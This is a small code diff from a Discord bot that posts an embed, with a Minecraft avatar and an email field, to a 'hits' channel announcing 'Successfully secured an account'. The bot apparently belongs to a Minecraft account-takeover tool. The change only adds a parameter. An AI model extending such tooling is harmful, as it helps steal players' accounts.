@@ -244,7 +244,8 @@ class MyModalOne(ui.Modal):
                             description=secured_desc,
                             color=0xF4A460 if mc_name else 0x678DC6
                         ).set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(mc_name)}/128"),
-                        email=email
+                        email = email,
+                        conly = True
                     )
 
                     await hits_channel.send("@everyone **Successfully secured an account**")
